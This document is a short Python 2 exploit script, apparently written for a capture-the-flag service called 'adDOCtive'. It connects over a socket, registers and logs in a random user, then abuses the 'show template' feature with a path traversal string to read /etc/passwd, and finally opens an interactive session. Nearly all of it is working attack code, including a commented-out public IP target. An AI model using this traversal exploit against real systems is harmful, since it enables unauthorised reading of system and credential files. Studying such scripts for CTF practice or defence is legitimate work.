#!/usr/bin/env python

import sys
import socket
import struct
import telnetlib
import time
import re
import string
import random

banner = """
            ############################################################
            ####                                                    ####
            #### adDOCtive - 'show template' file inclusion exploit ####
            ####                                                    ####
            ############################################################
        """

print banner

#s = socket.create_connection(("52.28.35.47", 1234))
s = socket.create_connection(("127.0.0.1", 13337))


def interact():
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()


def ra(to=.5):
    buf = ""
    s.setblocking(0)
    begin = time.time()
    while 1:
        if buf is not "" and time.time() - begin > to:
            break
        elif time.time() - begin > to*2:
            break
        try:
            data = s.recv(4096)
            if data:
                begin = time.time()
                buf += data
            else:
                time.sleep(.1)
        except:
            pass

    s.setblocking(1)
    return buf


def rt(delim):
    buf = ""
    while delim not in buf:
        buf += s.recv(1)
    return buf


def se(data):
    s.sendall(data)

def u32(d):
    return struct.unpack("<I", d)[0]

def u64(d):
    return struct.unpack("<Q",d)[0]


def p32(d):
    return struct.pack("<I", d)


def p64(d):
    return struct.pack("<Q", d)

def rstr(l):
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(l))

def register(user, passwd):
    se("1\n")
    se(user + "\n")
    se(passwd + "\n")

def login(user, passwd):
    se("2\n")
    se(user + "\n")
    se(passwd + "\n")

def create_template(name, content):
    se("4\n")
    se(name  + "\n")
    se(content + "\nEOF\n")

def instantiate_template(name, a, b, c):
    se("5\n")
    se(name + "\n")
    se(a + "\n")
    se(b + "\n")
    se(c + "\n")

def logout():
    se("0\n")

def show_template(name):
    se("3\n")
    se(name + "\n")



def pwn():
    target_file = "../" * 12 + "/etc/passwd"        # relative path to target file for the inclusion

    # generate random username/password
    username =  rstr(10) 
    password = rstr(10)


    # register new user
    print "[+] register new user"
    register(username, password)


    # login
    print "[+] logging in"
    login(username, password)
    ra()


    # exploit file inclusion bug
    show_template(target_file)

    print "[+] Here's your file: "
    interact()


pwn()

